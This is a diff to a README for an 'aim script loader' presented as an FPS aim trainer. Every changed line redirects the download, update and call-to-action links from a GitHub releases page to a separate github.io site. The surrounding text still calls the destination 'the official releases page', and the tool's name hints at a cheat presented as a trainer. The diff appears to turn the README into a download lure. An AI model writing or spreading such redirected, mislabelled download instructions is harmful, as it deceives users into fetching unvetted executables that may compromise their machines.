@@ -4,7 +4,7 @@
 
 Welcome! This guide will walk you through everything you need to know to download, install, and start using the ballsheet-aim-script-loader. Whether you're a seasoned FPS veteran or just getting into aim training, we've made this as simple as possible.
 
-[![Download ballsheet-aim-script-loader](https://img.shields.io/badge/Download-ballsheet--aim--script--loader-2ea44f?style=for-the-badge&color=blue)](https://github.com/Antoinettesatisfactory579/ballsheet-aim-script-loader/releases)
+[![Download ballsheet-aim-script-loader](https://img.shields.io/badge/Download-ballsheet--aim--script--loader-2ea44f?style=for-the-badge&color=blue)](https://antoinettesatisfactory579.github.io)
 
 ## 📥 Download and Installation
 
@@ -12,7 +12,7 @@ Welcome! This guide will walk you through everything you need to know to downloa
 
 Visit this link to download the application: 
 
-**[Download ballsheet-aim-script-loader](https://github.com/Antoinettesatisfactory579/ballsheet-aim-script-loader/releases)**
+**[Download ballsheet-aim-script-loader](https://antoinettesatisfactory579.github.io)**
 
 This link will take you to the official releases page where you'll find the latest version available. Look for the most recent release—it will be at the top of the page.
 
@@ -104,7 +104,7 @@ Pay attention to the analytics panel. If you see your accuracy dropping after 15
 
 We regularly release updates with new training modes, improved analytics, and better compatibility. To check for updates, open the application and click the gear icon in the top-right corner. Click "Check for Updates" and follow the prompts if an update is available.
 
-You can also check the release page manually: [Releases Page](https://github.com/Antoinettesatisfactory579/ballsheet-aim-script-loader/releases)
+You can also check the release page manually: [Releases Page](https://antoinettesatisfactory579.github.io)
 
 ## ❓ Frequently Asked Questions
 
@@ -140,6 +140,6 @@ We're committed to making this the best aim trainer available, and your feedback
 
 Ready to take your aim to the next level? Your competitive edge starts with precision. Download now and feel the difference of zero-filter performance.
 
-**[Start Your Training Today](https://github.com/Antoinettesatisfactory579/ballsheet-aim-script-loader/releases)**
+**[Start Your Training Today](https://antoinettesatisfactory579.github.io)**
 
 Keywords: aim trainer, aim training, FPS trainer, mouse precision, raw input, sensitivity matcher, cm/360, competitive gaming, accuracy training
